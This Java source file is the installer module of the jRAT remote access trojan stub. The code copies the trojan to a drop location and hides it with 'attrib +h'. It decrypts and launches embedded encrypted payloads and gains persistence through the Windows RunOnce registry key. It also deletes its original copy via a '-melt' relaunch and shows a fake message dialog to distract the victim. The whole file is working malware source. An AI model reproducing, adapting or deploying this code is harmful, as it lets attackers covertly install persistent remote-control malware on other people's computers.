package se.jrat.stub.modules.startup;

import java.awt.Desktop;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import se.jrat.common.DropLocations;
import se.jrat.common.crypto.CryptoUtils;
import se.jrat.stub.Configuration;
import se.jrat.stub.Main;
import se.jrat.stub.WinRegistry;
import se.jrat.stub.utils.Utils;

import com.redpois0n.oslib.OperatingSystem;

public class InstallerStartupModule extends StartupModule {
	
	private int locationIndex = -1;

	public InstallerStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		boolean b = !Boolean.parseBoolean(Configuration.getConfig().get("installed")) && Utils.getJarFile().isFile();
		try {
			if (b) {
				int dropLocation = Integer.parseInt(Configuration.getConfig().get("droppath"));
				
				if (locationIndex == dropLocation) {
					locationIndex++;
					run();
					return;
				}
				
				if (locationIndex != -1) {
					dropLocation = locationIndex;
				}
								
				boolean hideFile = Boolean.parseBoolean(Configuration.getConfig().get("hiddenfile"));

				String fileName = Configuration.getConfig().get("name");

				File file = DropLocations.getFile(dropLocation, fileName);

				if (file.getParentFile() != null && !file.getParentFile().exists()) {
					file.getParentFile().mkdirs();
				}
				
				if (hideFile && OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
					fileName = "." + fileName;
				}
				
				ZipFile thisFile = new ZipFile(Utils.getJarFile());

				ZipOutputStream outputStub;
				try {
					outputStub = new ZipOutputStream(new FileOutputStream(file));
				} catch (Exception e) {
					e.printStackTrace();
					thisFile.close();
					locationIndex++;
					run();
					return;
				}

				Enumeration<? extends ZipEntry> entries = thisFile.entries();
				while (entries.hasMoreElements()) {
					ZipEntry entry = entries.nextElement();
					
					if (entry.getName().equals("config.dat")) {
						byte[] extra = new byte[entry.getExtra().length + 1];

						for (int i = 0; i < entry.getExtra().length; i++) {
							extra[i] = entry.getExtra()[i];
						}
						
						entry.setExtra(extra);
					}
					
					InputStream inputStream = thisFile.getInputStream(entry);
					
					outputStub.putNextEntry(entry);
					if (!entry.isDirectory()) {
						byte[] buffer = new byte[1024];
						int read;
						while ((read = inputStream.read(buffer)) != -1) {
							outputStub.write(buffer, 0, read);
						}
					}
					outputStub.closeEntry();
				}			
				
				outputStub.close();
				thisFile.close();

				if (hideFile && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					Runtime.getRuntime().exec(new String[] { "attrib", "+h", file.getAbsolutePath() });
				}
				
				if (Configuration.getConfig().get("droptarget") != null) {
					String[] names = Configuration.getConfig().get("dropname").split(",");
					String[] dropTargets = Configuration.getConfig().get("droptarget").split(",");
					String[] exts = Configuration.getConfig().get("extension").split(",");

					for (int i = 0; i < names.length; i++) {
						int dropTarget;
						String name = names[i];
						String ext = exts[i];
						
						try {
							dropTarget = Integer.parseInt(dropTargets[i]);
						} catch (Exception ex) {
							ex.printStackTrace();
							continue;
						}
						
						File dropfile = DropLocations.getFile(dropTarget, name + ext);						
						
						Cipher cipher = CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, new SecretKeySpec(Configuration.getConfigKey(), "AES"), Configuration.getIV());
						InputStream is = new CipherInputStream(getClass().getResourceAsStream("/" + name + ext), cipher);
						
						FileOutputStream fos = new FileOutputStream(dropfile);
						int read;
						
						byte[] buffer = new byte[1024];
						
						while ((read = is.read(buffer)) != -1) {
							fos.write(buffer, 0, read);
						}

						is.close();
						fos.close();

						try {
							Desktop.getDesktop().open(dropfile); // TODO
						} catch (Exception ex) {
							ex.printStackTrace();
						}
					}

				}
				
				boolean runNextBoot = Boolean.parseBoolean(Configuration.getConfig().get("runnextboot"));
				boolean melt = Boolean.parseBoolean(Configuration.getConfig().get("melt"));

				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					
					String javaPath = System.getProperty("java.home") + "\\bin\\java";
					
					if (runNextBoot) {
						WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Java", "\"" + javaPath + "\" -jar \"" + file.getAbsolutePath() + "\"" + (melt ? " -melt" : ""));
					} else {
						if (melt) {
							Runtime.getRuntime().exec(new String[] { javaPath, "-jar", file.getAbsolutePath(), "-melt", Utils.getJarFile().getAbsolutePath() });
						} else {
							Runtime.getRuntime().exec(new String[] { javaPath, "-jar", file.getAbsolutePath() });
						}
					}
				} else {
					if (melt) {
						String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "-melt", mepath });
					} else {
						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
					}
				}
				if (Boolean.parseBoolean(Configuration.getConfig().get("fakewindow"))) {
					try {
						UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
					} catch (Exception e1) {
						e1.printStackTrace();
					}
					JOptionPane.showMessageDialog(null, Configuration.getConfig().get("fakemessage"), Configuration.getConfig().get("faketitle"), Integer.parseInt(Configuration.getConfig().get("fakeicon")));
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (b) {
				System.exit(0);	
			}
		}
	}
}
